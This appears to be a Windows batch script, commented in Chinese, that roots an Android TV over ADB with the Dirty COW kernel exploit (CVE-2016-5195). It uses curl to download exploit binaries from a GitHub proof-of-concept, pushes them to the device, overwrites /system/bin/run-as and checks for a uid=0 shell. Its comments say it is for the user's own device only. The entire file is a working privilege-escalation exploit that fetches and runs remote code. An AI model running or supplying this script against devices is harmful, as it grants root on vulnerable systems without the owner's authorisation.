@echo off
chcp 65001 >nul
setlocal

REM ============================================
REM  一键提权（Dirty COW / CVE-2016-5195）
REM  仅用于你自己的设备，重启后失效，需要重新运行
REM ============================================

REM 改成你的电视 IP
set TV_IP=192.168.1.50
set ADB=%~dp0..\platform-tools\adb.exe
if not exist "%ADB%" set ADB=adb

set ROOT=%~dp0..\root
if not exist "%ROOT%" mkdir "%ROOT%"

echo [1/5] 连接电视 %TV_IP% ...
"%ADB%" connect %TV_IP%:5555

echo [2/5] 准备漏洞利用工具 ...
if not exist "%ROOT%\dirtycow" (
    curl -L -o "%ROOT%\dirtycow" "https://raw.githubusercontent.com/davidqphan/dirtycow-android-poc/master/libs/armeabi-v7a/dirtycow"
)
if not exist "%ROOT%\run-as" (
    curl -L -o "%ROOT%\run-as" "https://raw.githubusercontent.com/davidqphan/dirtycow-android-poc/master/libs/armeabi-v7a/run-as"
)

echo [3/5] 推送到设备 ...
"%ADB%" push "%ROOT%\dirtycow" /data/local/tmp/dirtycow
"%ADB%" push "%ROOT%\run-as" /data/local/tmp/run-as
"%ADB%" shell chmod 755 /data/local/tmp/dirtycow /data/local/tmp/run-as

echo [4/5] 备份原始 run-as 并执行提权 ...
"%ADB%" shell "cat /system/bin/run-as > /data/local/tmp/run-as.orig"
"%ADB%" shell /data/local/tmp/dirtycow /data/local/tmp/run-as /system/bin/run-as

echo [5/5] 验证（出现 uid=0(root) 即成功）...
"%ADB%" shell "echo id ^| /system/bin/run-as"

echo.
echo 完成。root 仅本次开机有效，重启后需要重新运行本脚本。
pause
